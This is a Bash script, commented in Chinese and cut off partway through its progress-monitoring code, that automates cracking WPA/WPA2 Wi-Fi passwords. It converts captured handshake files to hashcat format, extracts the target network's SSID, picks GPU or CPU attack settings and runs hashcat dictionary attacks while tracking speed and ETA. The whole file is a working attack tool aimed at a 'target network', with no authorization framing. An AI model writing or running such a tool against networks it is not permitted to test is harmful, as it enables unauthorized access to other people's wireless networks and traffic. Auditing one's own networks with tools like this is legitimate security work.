#!/bin/bash
# WPA/WPA2 智能破解脚本 v2.2
# 支持交互式选择和自动从易到难依次破解
# 实时进度显示和性能监控
# 自动转换.cap握手包到hashcat格式

# 工具路径配置 - 自动检测或使用默认路径
# 优先级: 1. 环境变量 2. 系统安装路径 3. 当前目录相对路径

# 自动检测hashcat路径
detect_hashcat_path() {
    # 检查环境变量
    if [ -n "$HASHCAT_PATH" ] && [ -x "$HASHCAT_PATH/hashcat" ]; then
        echo "$HASHCAT_PATH"
        return 0
    fi

    # 检查系统安装路径
    if command -v hashcat >/dev/null 2>&1; then
        local hashcat_bin=$(which hashcat)
        local hashcat_dir=$(dirname "$hashcat_bin")
        if [ -x "$hashcat_dir/hashcat" ]; then
            echo "$hashcat_dir"
            return 0
        fi
    fi

    # 检查常见安装位置
    local common_paths=(
        "/opt/hashcat"
        "/usr/local/bin"
        "$(pwd)/hashcat-6.2.6"
        "./hashcat-6.2.6"
    )

    for path in "${common_paths[@]}"; do
        if [ -x "$path/hashcat" ]; then
            echo "$path"
            return 0
        fi
    done

    # 如果都找不到，返回当前目录下的hashcat-6.2.6
    echo "$(pwd)/hashcat-6.2.6"
}

# 自动检测hashcat-utils路径
detect_hashcat_utils_path() {
    # 检查环境变量
    if [ -n "$HASHCAT_UTILS_PATH" ] && [ -d "$HASHCAT_UTILS_PATH" ]; then
        echo "$HASHCAT_UTILS_PATH"
        return 0
    fi

    # 检查常见安装位置
    local common_paths=(
        "/opt/hashcat-utils/src"
        "/opt/hashcat-utils/bin"
        "$(pwd)/hashcat-utils-1.9/src"
        "./hashcat-utils-1.9/src"
    )

    for path in "${common_paths[@]}"; do
        if [ -d "$path" ]; then
            echo "$path"
            return 0
        fi
    done

    # 默认路径
    echo "$(pwd)/hashcat-utils-1.9/src"
}

# 自动检测hcxtools路径
detect_hcxtools_path() {
    # 检查环境变量
    if [ -n "$HCXTOOLS_PATH" ] && [ -d "$HCXTOOLS_PATH" ]; then
        echo "$HCXTOOLS_PATH"
        return 0
    fi

    # 检查系统安装路径
    if command -v hcxpcapngtool >/dev/null 2>&1; then
        local hcx_bin=$(which hcxpcapngtool)
        local hcx_dir=$(dirname "$hcx_bin")
        echo "$hcx_dir"
        return 0
    fi

    # 检查常见安装位置
    local common_paths=(
        "/opt/hcxtools"
        "/opt/hcxtools/bin"
        "$(pwd)/hcxtools-6.3.0"
        "./hcxtools-6.3.0"
    )

    for path in "${common_paths[@]}"; do
        if [ -d "$path" ] && [ -x "$path/hcxpcapngtool" ]; then
            echo "$path"
            return 0
        fi
    done

    # 默认路径
    echo "$(pwd)/hcxtools-6.3.0"
}

# 初始化工具路径
HASHCAT_PATH=$(detect_hashcat_path)
HASHCAT_UTILS_PATH=$(detect_hashcat_utils_path)
HCXTOOLS_PATH=$(detect_hcxtools_path)

# 验证工具路径
verify_tool_paths() {
    echo -e "${BLUE}=== 工具路径检测结果 ===${NC}"

    # 检查hashcat
    if [ -x "$HASHCAT_PATH/hashcat" ]; then
        echo -e "${GREEN}✅ hashcat: $HASHCAT_PATH${NC}"
    else
        echo -e "${YELLOW}⚠️  hashcat: $HASHCAT_PATH (未找到可执行文件)${NC}"
    fi

    # 检查hashcat-utils
    if [ -d "$HASHCAT_UTILS_PATH" ]; then
        local utils_count=$(find "$HASHCAT_UTILS_PATH" -name "*.bin" 2>/dev/null | wc -l)
        if [ $utils_count -gt 0 ]; then
            echo -e "${GREEN}✅ hashcat-utils: $HASHCAT_UTILS_PATH ($utils_count 个工具)${NC}"
        else
            echo -e "${YELLOW}⚠️  hashcat-utils: $HASHCAT_UTILS_PATH (目录存在但无工具)${NC}"
        fi
    else
        echo -e "${YELLOW}⚠️  hashcat-utils: $HASHCAT_UTILS_PATH (目录不存在)${NC}"
    fi

    # 检查hcxtools
    if [ -x "$HCXTOOLS_PATH/hcxpcapngtool" ]; then
        echo -e "${GREEN}✅ hcxtools: $HCXTOOLS_PATH${NC}"
    elif command -v hcxpcapngtool >/dev/null 2>&1; then
        echo -e "${GREEN}✅ hcxtools: 系统安装 ($(which hcxpcapngtool))${NC}"
    else
        echo -e "${YELLOW}⚠️  hcxtools: $HCXTOOLS_PATH (未找到)${NC}"
    fi

    echo -e "${BLUE}=========================${NC}"
    echo

    # 提示用户如何自定义路径
    echo -e "${CYAN}💡 提示: 如需自定义工具路径，可设置环境变量:${NC}"
    echo -e "${CYAN}   export HASHCAT_PATH=/your/hashcat/path${NC}"
    echo -e "${CYAN}   export HASHCAT_UTILS_PATH=/your/hashcat-utils/path${NC}"
    echo -e "${CYAN}   export HCXTOOLS_PATH=/your/hcxtools/path${NC}"
    echo
}

# 默认参数
WORKLOAD_PROFILE=""  # 工作负载配置 (1-4)
DEBUG_MODE=false     # 调试模式开关

# 字典文件目录配置 - 支持环境变量覆盖
if [ -n "$DICT_DIR" ]; then
    # 使用环境变量中的字典目录
    DICT_DIR="$DICT_DIR"
else
    # 默认为脚本同目录下的dic_file目录
    DICT_DIR="$(pwd)/dic_file"
fi

# 使用说明
show_usage() {
    echo -e "${CYAN}用法: $0 [握手包文件] [-w 工作负载] [--debug]${NC}"
    echo -e "${YELLOW}参数说明:${NC}"
    echo -e "  握手包文件    支持.cap或.hc22000格式的握手包文件"
    echo -e "  -w 工作负载   设置hashcat工作负载强度 (1-4, 默认: 自动选择)"
    echo -e "              1: 低强度 (桌面使用)"
    echo -e "              2: 中等强度 (默认)"
    echo -e "              3: 高强度 (专用破解)"
    echo -e "              4: 疯狂模式 (最高性能，可能导致掉卡)"
    echo -e "  --debug       启用调试模式，显示详细状态信息"
    echo -e "${YELLOW}示例:${NC}"
    echo -e "  $0 handshake.cap        # 使用.cap文件(自动转换)"
    echo -e "  $0 handshake.cap -w 2   # 使用中等工作负载"
    echo -e "  $0 -w 1 --debug         # 使用低工作负载和调试模式"
    echo
    exit 1
}

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# 全局变量用于进程管理
HASHCAT_PID=""
MONITOR_PID=""
STATUS_FILE=""

# 清理函数
cleanup() {
    echo -e "\n${YELLOW}🛑 正在清理进程...${NC}"

    # 杀死hashcat进程
    if [ -n "$HASHCAT_PID" ] && kill -0 "$HASHCAT_PID" 2>/dev/null; then
        echo -e "${YELLOW}⏹️  停止hashcat进程 (PID: $HASHCAT_PID)...${NC}"
        kill -TERM "$HASHCAT_PID" 2>/dev/null
        sleep 2
        if kill -0 "$HASHCAT_PID" 2>/dev/null; then
            echo -e "${RED}🔥 强制终止hashcat进程...${NC}"
            kill -KILL "$HASHCAT_PID" 2>/dev/null
        fi
    fi

    # 杀死监控进程
    if [ -n "$MONITOR_PID" ] && kill -0 "$MONITOR_PID" 2>/dev/null; then
        kill -TERM "$MONITOR_PID" 2>/dev/null
        wait "$MONITOR_PID" 2>/dev/null
    fi

    # 清理临时文件
    if [ -n "$STATUS_FILE" ] && [ -f "$STATUS_FILE" ]; then
        rm -f "$STATUS_FILE" 2>/dev/null
    fi

    # 清理会话文件
    rm -f current_attack.restore current_attack.log 2>/dev/null

    echo -e "${GREEN}✅ 清理完成${NC}"
}

# 设置信号处理器
trap cleanup EXIT
trap 'echo -e "\n${YELLOW}⚠️  收到中断信号，正在安全退出...${NC}"; cleanup; exit 130' INT TERM

# 从握手包中提取SSID信息
extract_ssid_from_handshake() {
    local handshake_file="$1"
    local ssid=""

    # 检测文件格式并提取SSID
    if [[ "$handshake_file" == *.hc22000 ]] || [[ "$handshake_file" == *.22000 ]]; then
        # 从.hc22000格式文件提取SSID
        # .hc22000格式: WPA*01*PMKID*MAC_AP*MAC_STA*ESSID_HEX*ANONCE*EAPOL*MESSAGEPAIR
        # 或: WPA*02*PMKID*MAC_AP*MAC_STA*ESSID_HEX*ANONCE*EAPOL*MESSAGEPAIR*KEYVER*KEYMIC
        if [ -f "$handshake_file" ] && [ -s "$handshake_file" ]; then
            # 读取第一行并提取ESSID字段（第6个字段）
            local first_line=$(head -n 1 "$handshake_file" 2>/dev/null)
            if [ -n "$first_line" ]; then
                local essid_hex=$(echo "$first_line" | cut -d'*' -f6 2>/dev/null)
                if [ -n "$essid_hex" ] && [ "$essid_hex" != "" ]; then
                    # 将十六进制转换为ASCII
                    ssid=$(echo "$essid_hex" | xxd -r -p 2>/dev/null | tr -d '\0' 2>/dev/null)
                    # 如果转换失败，尝试直接使用十六进制
                    if [ -z "$ssid" ]; then
                        ssid="$essid_hex (hex)"
                    fi
                fi
            fi
        fi
    elif [[ "$handshake_file" == *.hccapx ]]; then
        # 从.hccapx格式文件提取SSID
        # 使用hcxtools或其他工具提取
        if command -v hcxpcapngtool >/dev/null 2>&1; then
            ssid=$(hcxpcapngtool -E "$handshake_file" 2>/dev/null | head -n 1 | cut -d':' -f2 2>/dev/null)
        elif [ -x "$HCXTOOLS_PATH/hcxpcapngtool" ]; then
            ssid=$("$HCXTOOLS_PATH/hcxpcapngtool" -E "$handshake_file" 2>/dev/null | head -n 1 | cut -d':' -f2 2>/dev/null)
        fi
    elif [[ "$handshake_file" == *.cap ]] || [[ "$handshake_file" == *.pcap ]]; then
        # 从.cap/.pcap文件提取SSID
        # 使用tshark或tcpdump提取
        if command -v tshark >/dev/null 2>&1; then
            ssid=$(tshark -r "$handshake_file" -Y "wlan.fc.type_subtype == 8" -T fields -e wlan.ssid 2>/dev/null | head -n 1 | tr -d '\0')
        elif command -v tcpdump >/dev/null 2>&1; then
            # tcpdump方法（较复杂，作为备选）
            ssid=$(tcpdump -r "$handshake_file" -nn 2>/dev/null | grep -o 'SSID [^)]*' | head -n 1 | sed 's/SSID //' 2>/dev/null)
        fi
    fi

    # 清理SSID字符串，移除不可打印字符
    if [ -n "$ssid" ]; then
        ssid=$(echo "$ssid" | tr -cd '[:print:]' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
    fi

    # 如果SSID为空或只包含空白字符，设置为未知
    if [ -z "$ssid" ] || [[ "$ssid" =~ ^[[:space:]]*$ ]]; then
        ssid="未知"
    fi

    echo "$ssid"
}

# 显示横幅
show_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}     WPA/WPA2 智能破解工具 v2.2       ${NC}"
    echo -e "${CYAN}============================================${NC}"
    echo -e "${YELLOW}握手包文件: $HANDSHAKE${NC}"

    # 提取并显示SSID信息
    local target_ssid=$(extract_ssid_from_handshake "$HANDSHAKE")
    if [ "$target_ssid" != "未知" ]; then
        echo -e "${GREEN}🎯 目标网络: $target_ssid${NC}"
    else
        echo -e "${YELLOW}🎯 目标网络: $target_ssid${NC}"
    fi

    echo -e "${YELLOW}设备: ${DEVICE_TYPE:-未知}${NC}"
    echo -e "${YELLOW}性能: ${EXPECTED_SPEED:-未知} (WPA-PBKDF2模式)${NC}"
    if [ -n "$WORKLOAD_PROFILE" ]; then
        local workload_desc=""
        case "$WORKLOAD_PROFILE" in
            1) workload_desc="低强度 (桌面使用)" ;;
            2) workload_desc="中等强度 (默认)" ;;
            3) workload_desc="高强度 (专用破解)" ;;
            4) workload_desc="疯狂模式 (最高性能)" ;;
        esac
        echo -e "${YELLOW}工作负载: $WORKLOAD_PROFILE - $workload_desc${NC}"
    else
        echo -e "${YELLOW}工作负载: 自动选择${NC}"
    fi
    echo -e "${CYAN}============================================${NC}"
    echo
}

# 检测转换工具
check_conversion_tools() {
    local tool_found=false
    
    echo -e "${YELLOW}检测握手包转换工具...${NC}"
    
    # 优先检查 hcxpcapngtool (推荐，支持.hc22000格式)
    if command -v hcxpcapngtool >/dev/null 2>&1; then
        CONVERSION_TOOL="hcxpcapngtool"
        tool_found=true
        echo -e "${GREEN}✅ 找到 hcxpcapngtool (推荐工具，支持.hc22000格式)${NC}"
    # 检查本地 hcxtools
    elif [ -x "$HCXTOOLS_PATH/hcxpcapngtool" ]; then
        CONVERSION_TOOL="$HCXTOOLS_PATH/hcxpcapngtool"
        tool_found=true
        echo -e "${GREEN}✅ 找到本地 hcxpcapngtool (支持.hc22000格式)${NC}"
    # 检查本地 hashcat-utils 中的 cap2hccapx（备选）
    elif [ -x "$HASHCAT_UTILS_PATH/cap2hccapx.bin" ]; then
        CONVERSION_TOOL="$HASHCAT_UTILS_PATH/cap2hccapx.bin"
        tool_found=true
        echo -e "${YELLOW}✅ 找到本地 cap2hccapx.bin (生成.hccapx格式)${NC}"
    # 检查 cap2hashcat
    elif command -v cap2hashcat >/dev/null 2>&1; then
        CONVERSION_TOOL="cap2hashcat"
        tool_found=true
        echo -e "${GREEN}✅ 找到 cap2hashcat${NC}"
    # 检查 hcxtools 包中的其他工具
    elif command -v hcxpcaptool >/dev/null 2>&1; then
        CONVERSION_TOOL="hcxpcaptool"
        tool_found=true
        echo -e "${GREEN}✅ 找到 hcxpcaptool${NC}"
    fi
    
    if [ "$tool_found" = false ]; then
        echo -e "${RED}❌ 未找到握手包转换工具！${NC}"
        echo -e "${YELLOW}请安装以下工具之一：${NC}"
        echo -e "${YELLOW}1. hcxtools: sudo apt install hcxtools${NC}"
        echo -e "${YELLOW}2. hashcat-utils: sudo apt install hashcat-utils${NC}"
        echo -e "${YELLOW}3. 或修改脚本中的工具路径变量${NC}"
        echo -e "${YELLOW}   HASHCAT_UTILS_PATH 和 HCXTOOLS_PATH${NC}"
        return 1
    fi
    
    return 0
}

# 转换.cap文件到hashcat格式
convert_cap_to_hashcat() {
    local input_file="$1"
    local output_file="$2"
    
    echo -e "${CYAN}正在转换握手包: $input_file -> $output_file${NC}"
    
    case "$CONVERSION_TOOL" in
        "hcxpcapngtool"|*/hcxpcapngtool)
            # hcxpcapngtool 输出.hc22000格式 (推荐)
            local hc22000_file="${output_file%.*}.hc22000"
            "$CONVERSION_TOOL" -o "$hc22000_file" "$input_file" 2>/dev/null
            # 检查.hc22000文件是否生成成功
            if [ -f "$hc22000_file" ] && [ -s "$hc22000_file" ]; then
                export HANDSHAKE="$hc22000_file"
                echo -e "${GREEN}✅ 转换成功，使用.hc22000格式文件${NC}"
                return 0
            fi
            ;;
        */cap2hccapx.bin)
            # 使用本地 cap2hccapx.bin 工具，输出.hccapx格式（备选）
            local hccapx_file="${output_file%.*}.hccapx"
            "$CONVERSION_TOOL" "$input_file" "$hccapx_file" 2>/dev/null
            # 检查.hccapx文件是否生成成功
            if [ -f "$hccapx_file" ] && [ -s "$hccapx_file" ]; then
                export HANDSHAKE="$hccapx_file"
                echo -e "${YELLOW}注意: 使用.hccapx格式文件进行破解${NC}"
                return 0
            fi
            ;;
        "cap2hashcat")
            cap2hashcat "$input_file" "$output_file" 2>/dev/null
            ;;
        "hcxpcaptool")
            hcxpcaptool -z "$output_file" "$input_file" 2>/dev/null
            ;;
        *)
            echo -e "${RED}❌ 未知的转换工具: $CONVERSION_TOOL${NC}"
            return 1
            ;;
    esac
    
    if [ $? -eq 0 ] && [ -f "$output_file" ] && [ -s "$output_file" ]; then
        echo -e "${GREEN}✅ 转换成功！${NC}"
        return 0
    else
        echo -e "${RED}❌ 转换失败！${NC}"
        echo -e "${YELLOW}可能原因：${NC}"
        echo -e "${YELLOW}1. 输入的.cap文件可能不包含有效的握手包${NC}"
        echo -e "${YELLOW}2. 文件格式不正确或已损坏${NC}"
        echo -e "${YELLOW}3. 握手包不完整(缺少关键帧)${NC}"
        return 1
    fi
}

# 处理命令行参数
parse_arguments() {
    input_file=""  # 改为全局变量
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -w|--workload)
                if [[ -n "$2" && "$2" =~ ^[1-4]$ ]]; then
                    WORKLOAD_PROFILE="$2"
                    shift 2
                else
                    echo -e "${RED}错误: -w 参数需要1-4之间的数值${NC}"
                    show_usage
                fi
                ;;
            -h|--help)
                show_usage
                ;;
            --debug)
                DEBUG_MODE=true
                shift
                ;;
            -*)
                echo -e "${RED}错误: 未知参数 $1${NC}"
                show_usage
                ;;
            *)
                if [ -z "$input_file" ]; then
                    input_file="$1"
                    shift
                else
                    echo -e "${RED}错误: 只能指定一个握手包文件${NC}"
                    show_usage
                fi
                ;;
        esac
    done
}

# 处理握手包文件
process_handshake_file() {
    local input_file="$1"
    
    # 如果没有提供文件，使用默认文件
    if [ -z "$input_file" ]; then
        echo -e "${YELLOW}未指定握手包文件，使用默认文件${NC}"
        HANDSHAKE="../handshake_22000.hc22000"
        if [ ! -f "$HANDSHAKE" ]; then
            echo -e "${RED}错误: 默认握手包文件 $HANDSHAKE 不存在！${NC}"
            echo -e "${YELLOW}请提供.cap或.hc22000格式的握手包文件${NC}"
            show_usage
        fi
        return 0
    fi
    
    # 检查文件是否存在
    if [ ! -f "$input_file" ]; then
        echo -e "${RED}错误: 文件 $input_file 不存在！${NC}"
        show_usage
    fi
    
    # 获取文件扩展名
    local file_ext="${input_file##*.}"
    local base_name="${input_file%.*}"
    
    case "$file_ext" in
        "cap"|"pcap")
            echo -e "${CYAN}检测到.cap/.pcap文件，准备转换...${NC}"

            # 在转换前尝试提取SSID信息
            local cap_ssid=$(extract_ssid_from_handshake "$input_file")
            if [ "$cap_ssid" != "未知" ]; then
                echo -e "${CYAN}📡 从原始握手包检测到目标网络: ${GREEN}$cap_ssid${NC}"
            fi

            # 检查转换工具
            if ! check_conversion_tools; then
                exit 1
            fi

            # 设置输出文件名
            local output_file="${base_name}.hc22000"

            # 执行转换
            if convert_cap_to_hashcat "$input_file" "$output_file"; then
                # 如果HANDSHAKE变量被convert_cap_to_hashcat函数更新（比如.hccapx格式），使用更新后的值
                if [ -z "$HANDSHAKE" ] || [ "$HANDSHAKE" = "$output_file" ]; then
                    HANDSHAKE="$output_file"
                fi
                echo -e "${GREEN}✅ 使用转换后的文件: $HANDSHAKE${NC}"
            else
                exit 1
            fi
            ;;
        "hc22000"|"22000")
            echo -e "${CYAN}检测到hashcat格式文件，直接使用${NC}"
            HANDSHAKE="$input_file"
            ;;
        *)
            echo -e "${RED}❌ 不支持的文件格式: .$file_ext${NC}"
            echo -e "${YELLOW}支持的格式: .cap, .pcap, .hc22000, .22000${NC}"
            show_usage
            ;;
    esac
    
    # 验证最终的握手包文件
    if [ ! -f "$HANDSHAKE" ] || [ ! -s "$HANDSHAKE" ]; then
        echo -e "${RED}❌ 握手包文件验证失败！${NC}"
        exit 1
    fi

    echo -e "${GREEN}✅ 握手包文件准备完成: $HANDSHAKE${NC}"

    # 提取并显示目标网络SSID
    local target_ssid=$(extract_ssid_from_handshake "$HANDSHAKE")
    if [ "$target_ssid" != "未知" ]; then
        echo -e "${CYAN}🎯 检测到目标网络: ${GREEN}$target_ssid${NC}"
    else
        echo -e "${YELLOW}⚠️  无法从握手包中提取网络名称，但握手包有效${NC}"
        echo -e "${YELLOW}💡 将继续进行密码破解${NC}"
    fi
    echo
}

# 处理命令行参数
if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
    show_usage
fi

# 解析命令行参数 - 直接调用函数而不使用子shell
parse_arguments "$@"
HANDSHAKE_FILE="$input_file"

# 处理握手包文件
process_handshake_file "$HANDSHAKE_FILE"

# 保存握手包文件的绝对路径
if [[ "$HANDSHAKE" != /* ]]; then
    HANDSHAKE="$(pwd)/$HANDSHAKE"
fi

# 切换到hashcat目录
if [ ! -d "$HASHCAT_PATH" ]; then
    echo -e "${RED}错误: 未找到hashcat目录: $HASHCAT_PATH${NC}"
    echo -e "${YELLOW}请检查hashcat是否正确安装，或设置HASHCAT_PATH环境变量${NC}"
    exit 1
fi

echo -e "${BLUE}使用hashcat路径: $HASHCAT_PATH${NC}"
cd "$HASHCAT_PATH"

# 检测握手包格式并设置hashcat模式
detect_hash_mode() {
    local file="$1"
    
    if [[ "$file" == *.hc22000 ]] || [[ "$file" == *.22000 ]]; then
        HASH_MODE="22000"  # .hc22000格式使用模式22000
        echo -e "${GREEN}检测到.hc22000格式，使用hashcat模式22000${NC}"
    elif [[ "$file" == *.hccapx ]]; then
        HASH_MODE="22000"  # .hccapx格式也建议转换为22000模式
        echo -e "${YELLOW}检测到.hccapx格式，建议使用hashcat模式22000（模式2500已废弃）${NC}"
    else
        # 尝试通过文件内容检测
        if head -c 4 "$file" 2>/dev/null | grep -q "HCPX"; then
            HASH_MODE="22000"
            echo -e "${YELLOW}检测到.hccapx格式内容，使用hashcat模式22000（模式2500已废弃）${NC}"
        else
            HASH_MODE="22000"
            echo -e "${YELLOW}默认使用hashcat模式22000${NC}"
        fi
    fi
}

# 设备检测和参数配置
detect_devices() {
    echo -e "${YELLOW}正在检测GPU/CPU设备...${NC}"
    
    # 检测握手包格式
    detect_hash_mode "$HANDSHAKE"
    
    # 检测设备
    local device_info=$(./hashcat -I 2>/dev/null)
    local gpu_available=false
    local cpu_available=false
    
    if echo "$device_info" | grep -qi "cuda\|opencl\|hip"; then
        if echo "$device_info" | grep -qi "nvidia\|geforce\|rtx\|gtx"; then
            gpu_available=true
            echo -e "${GREEN}✅ 检测到NVIDIA GPU设备${NC}"
        elif echo "$device_info" | grep -qi "amd\|radeon"; then
            gpu_available=true  
            echo -e "${GREEN}✅ 检测到AMD GPU设备${NC}"
        fi
    fi
    
    if echo "$device_info" | grep -qi "cpu\|processor"; then
        cpu_available=true
        echo -e "${GREEN}✅ 检测到CPU设备${NC}"
    fi
    
    # 如果既没有GPU也没有CPU，尝试使用基本模式
    if [ "$gpu_available" = false ] && [ "$cpu_available" = false ]; then
        echo -e "${YELLOW}⚠️  未检测到标准设备，尝试基本模式...${NC}"
        # 测试是否能运行基本hashcat命令
        if ./hashcat --version >/dev/null 2>&1; then
            cpu_available=true
            echo -e "${GREEN}✅ hashcat可执行，使用基本模式${NC}"
        fi
    fi
    
    # 配置基础命令
    if [ "$gpu_available" = true ]; then
        # GPU模式 - 使用用户指定的工作负载或默认高性能
        local workload=${WORKLOAD_PROFILE:-4}
        BASE_CMD="./hashcat -m $HASH_MODE $HANDSHAKE --force -O -w $workload"
        DEVICE_TYPE="GPU"
        EXPECTED_SPEED="8.6 MH/s"
        echo -e "${GREEN}🚀 使用GPU加速模式 (工作负载: $workload)${NC}"
    elif [ "$cpu_available" = true ]; then
        # CPU模式 - 使用用户指定的工作负载或默认中等强度
        local workload=${WORKLOAD_PROFILE:-3}
        BASE_CMD="./hashcat -m $HASH_MODE $HANDSHAKE --force -w $workload"
        DEVICE_TYPE="CPU"
        EXPECTED_SPEED="~50 KH/s"
        echo -e "${YELLOW}⚠️  使用CPU模式 (性能较低，工作负载: $workload)${NC}"
        echo -e "${YELLOW}💡 建议安装GPU驱动以获得更好性能${NC}"
    else
        # 无设备可用 - 错误状态
        echo -e "${RED}❌ 未检测到可用的GPU或CPU设备！${NC}"
        echo -e "${RED}请检查以下项目：${NC}"
        echo -e "${RED}1. NVIDIA驱动 (440.64+) 和 CUDA Toolkit (9.0+)${NC}"
        echo -e "${RED}2. AMD驱动 (AMDGPU 21.50+) 和 ROCm (5.0+)${NC}"
        echo -e "${RED}3. Intel OpenCL Runtime${NC}"
        echo -e "${YELLOW}💡 或者可以尝试 '--force' 参数强制使用CPU模式${NC}"
        
        read -p "是否要尝试强制CPU模式? [y/N]: " force_cpu
        if [[ $force_cpu =~ ^[Yy]$ ]]; then
            local workload=${WORKLOAD_PROFILE:-1}
            BASE_CMD="./hashcat -m $HASH_MODE $HANDSHAKE --force -w $workload"
            DEVICE_TYPE="CPU (强制模式)"
            EXPECTED_SPEED="~10 KH/s"
            echo -e "${YELLOW}🔧 使用强制CPU模式 (工作负载: $workload)${NC}"
        else
            return 1
        fi
    fi
    
    echo -e "${CYAN}设备类型: ${DEVICE_TYPE} | 预期性能: ${EXPECTED_SPEED}${NC}"
    return 0
}

# 初始化设备检测
if ! detect_devices; then
    echo -e "${RED}设备初始化失败，程序退出${NC}"
    exit 1
fi

# 计算平滑速度的辅助函数
calculate_smooth_speed() {
    local speed_array=("$@")
    local array_length=${#speed_array[@]}

    if [ "$array_length" -eq 0 ]; then
        echo "0"
        return
    fi

    # 计算加权平均速度（最近的速度权重更高）
    local weighted_sum=0
    local weight_sum=0
    local i=0

    for speed in "${speed_array[@]}"; do
        local weight=$((i + 1))  # 权重递增，最新的速度权重最高
        weighted_sum=$((weighted_sum + speed * weight))
        weight_sum=$((weight_sum + weight))
        i=$((i + 1))
    done

    if [ "$weight_sum" -gt 0 ]; then
        echo $((weighted_sum / weight_sum))
    else
        echo "0"
    fi
}

# 格式化ETA显示的辅助函数
format_eta() {
    local seconds=$1

    if [ "$seconds" -le 0 ]; then
        echo "计算中..."
        return
    fi

    if [ "$seconds" -lt 60 ]; then
        echo "${seconds}秒"
    elif [ "$seconds" -lt 3600 ]; then
        local mins=$((seconds / 60))
        local secs=$((seconds % 60))
        if [ "$secs" -gt 0 ]; then
            echo "${mins}分${secs}秒"
        else
            echo "${mins}分钟"
        fi
    elif [ "$seconds" -lt 86400 ]; then
        local hours=$((seconds / 3600))
        local mins=$(((seconds % 3600) / 60))
        if [ "$mins" -gt 0 ]; then
            echo "${hours}时${mins}分"
        else
            echo "${hours}小时"
        fi
    else
        local days=$((seconds / 86400))
        local hours=$(((seconds % 86400) / 3600))
        if [ "$hours" -gt 0 ]; then
            echo "${days}天${hours}时"
        else
            echo "${days}天"
        fi
    fi
}

# 进度监控函数 - 重新设计以获得更可靠的实时进度
monitor_progress() {
    local attack_name="$1"
    local total_passwords="$2"
    local hashcat_pid="$3"

    # 创建进度监控循环
    {
        echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${CYAN}🚀 攻击进行中: ${attack_name}${NC}"
        if [ -n "$total_passwords" ] && [ "$total_passwords" != "unknown" ]; then
            echo -e "${YELLOW}📊 密码空间: $(printf "%'d" $total_passwords) 个密码${NC}"
            # 根据设备类型计算预估时间
            local base_speed
            if [ "$DEVICE_TYPE" = "GPU" ]; then
                base_speed=8600000  # 8.6 MH/s for GPU
            else
                base_speed=50000    # 50 KH/s for CPU
            fi

            local estimated_seconds=$(echo "scale=1; $total_passwords / $base_speed" | bc -l 2>/dev/null || echo "unknown")
            if [ "$estimated_seconds" != "unknown" ] && [ -n "$estimated_seconds" ]; then
                if (( $(echo "$estimated_seconds < 60" | bc -l 2>/dev/null || echo 0) )); then
                    echo -e "${YELLOW}⏱️  预估时间: ${estimated_seconds}秒${NC}"
                elif (( $(echo "$estimated_seconds < 3600" | bc -l 2>/dev/null || echo 0) )); then
                    local minutes=$(echo "scale=1; $estimated_seconds / 60" | bc -l 2>/dev/null || echo "unknown")
                    echo -e "${YELLOW}⏱️  预估时间: ${minutes}分钟${NC}"
                elif (( $(echo "$estimated_seconds < 86400" | bc -l 2>/dev/null || echo 0) )); then
                    local hours=$(echo "scale=1; $estimated_seconds / 3600" | bc -l 2>/dev/null || echo "unknown")
                    echo -e "${YELLOW}⏱️  预估时间: ${hours}小时${NC}"
                else
                    local days=$(echo "scale=1; $estimated_seconds / 86400" | bc -l 2>/dev/null || echo "unknown")
                    echo -e "${YELLOW}⏱️  预估时间: ${days}天${NC}"
                fi
            fi
        fi
        echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

        local start_time=$(date +%s)
        local last_progress=0
        local last_speed=0
        local iteration_count=0
        local consecutive_no_progress=0

        # 动态ETA计算相关变量
        local speed_history=()
        local speed_history_max=5  # 保留最近5次速度记录用于平滑计算
        local last_progress_time=$start_time
        local last_progress_value=0

        while kill -0 $hashcat_pid 2>/dev/null; do
            iteration_count=$((iteration_count + 1))
            local current_time=$(date +%s)
            local elapsed_time=$((current_time - start_time))

            # 从hashcat状态文件读取实时信息
            local current_progress=0
            local current_speed=0
            local progress_percentage=0
            local eta_seconds=0
            local status_found=false
            local speed_display=""

            if [ -f "$STATUS_FILE" ]; then
                # 读取最新的状态信息，过滤掉硬件监控信息
                local latest_lines=$(tail -50 "$STATUS_FILE" 2>/dev/null | grep -v "Hardware.Mon" | grep -v "Candidates")

                # 提取进度信息 (Progress.........: 4/4 (100.00%))
                local progress_line=$(echo "$latest_lines" | grep "Progress\.\.\.\.\.\.\.\.\.\." | tail -1)
                if [ -n "$progress_line" ]; then
                    # 提取当前进度数字和总数 - 修正正则表达式
                    local progress_match=$(echo "$progress_line" | sed -n 's/.*Progress\..*:\s*\([0-9]*\)\/\([0-9]*\)\s*(\([0-9.]*\)%).*/\1|\2|\3/p' 2>/dev/null)
                    if [ -n "$progress_match" ]; then
                        current_progress=$(echo "$progress_match" | cut -d'|' -f1)
                        local total_progress=$(echo "$progress_match" | cut -d'|' -f2)
                        progress_percentage=$(echo "$progress_match" | cut -d'|' -f3)
                        status_found=true

                        # 如果没有预设总数，使用从进度行提取的总数
                        if [ -n "$total_progress" ] && [ "$total_progress" -gt 0 ] && [ "$total_passwords" = "unknown" ]; then
                            total_passwords="$total_progress"
                        fi

                        # 调试输出
                        if [ "$DEBUG_MODE" = true ]; then
                            echo "DEBUG: Found progress line: $progress_line" >&2
                            echo "DEBUG: Extracted: current=$current_progress, total=$total_progress, percentage=$progress_percentage" >&2
                        fi
                    else
                        # 如果正则匹配失败，尝试更简单的匹配
                        if [ "$DEBUG_MODE" = true ]; then
                            echo "DEBUG: Progress regex failed, trying simple match for: $progress_line" >&2
                        fi
                        # 尝试只提取百分比
                        progress_percentage=$(echo "$progress_line" | sed -n 's/.*(\([0-9.]*\)%).*/\1/p' 2>/dev/null)
                        if [ -n "$progress_percentage" ]; then
